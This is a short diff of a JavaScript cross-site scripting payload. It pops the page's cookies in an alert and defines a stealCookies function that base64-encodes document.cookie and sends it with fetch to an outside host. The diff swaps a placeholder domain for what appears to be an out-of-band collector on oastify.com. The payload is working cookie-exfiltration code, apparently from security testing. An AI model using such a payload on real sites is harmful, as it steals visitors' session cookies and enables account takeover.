@@ -1,7 +1,7 @@
 
 alert(document.cookie);
 function stealCookies(){
-  const url = 'https://site.com/?cookies=' + btoa(document.cookie)
+  const url = 'https://urp749xlmmbt92sh6x6eo96sojuaie63.oastify.com/?cookies=' + btoa(document.cookie)
   const response = fetch(url)
 }
 
